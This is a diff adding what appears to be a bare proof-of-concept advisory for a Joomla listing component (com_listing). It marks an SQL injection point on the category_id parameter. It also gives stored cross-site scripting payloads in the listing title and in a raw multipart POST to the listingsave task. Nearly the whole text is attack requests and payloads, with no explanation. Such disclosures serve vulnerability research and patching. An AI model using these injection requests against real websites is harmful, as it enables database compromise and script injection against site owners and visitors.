@@ -1,0 +1,49 @@
+http://www.example.com/index.php?option=com_listing&task=browse&category_id=1[SQL]
+
+http://www.example.com/index.php?option=com_listing&task=post&Itemid=2
+Listing Title: <IMG """><SCRIPT>alert("XSS")</SCRIPT>
+
+Get:http://www.example.com/index.php?option=com_listing&task=listingsave
+Post:
+ 
+-----------------------------106542362324353\r\n
+Content-Disposition: form-data; name="listing_title"\r\n
+\r\n
+\r\n
+-----------------------------106542362324353\r\n
+Content-Disposition: form-data; name="description"\r\n
+\r\n
+<p><IMG """><SCRIPT>alert("XSS")</SCRIPT></p>\r\n  <-----------------------------------click here
+-----------------------------106542362324353\r\n
+Content-Disposition: form-data; name="homeurl"\r\n
+\r\n
+\r\n
+-----------------------------106542362324353\r\n
+Content-Disposition: form-data; name="category_id"\r\n
+\r\n
+34\r\n
+-----------------------------106542362324353\r\n
+Content-Disposition: form-data; name="paystring"\r\n
+\r\n
+\r\n
+-----------------------------106542362324353\r\n
+Content-Disposition: form-data; name="sell_price"\r\n
+\r\n
+\r\n
+-----------------------------106542362324353\r\n
+Content-Disposition: form-data; name="shipping_cost"\r\n
+\r\n
+\r\n
+-----------------------------106542362324353\r\n
+Content-Disposition: form-data; name="quantity"\r\n
+\r\n
+\r\n
+-----------------------------106542362324353\r\n
+Content-Disposition: form-data; name="submit"\r\n
+\r\n
+Submit\r\n
+-----------------------------106542362324353\r\n
+Content-Disposition: form-data; name="listing_id"\r\n
+\r\n
+\r\n
+-----------------------------106542362324353--\r\n
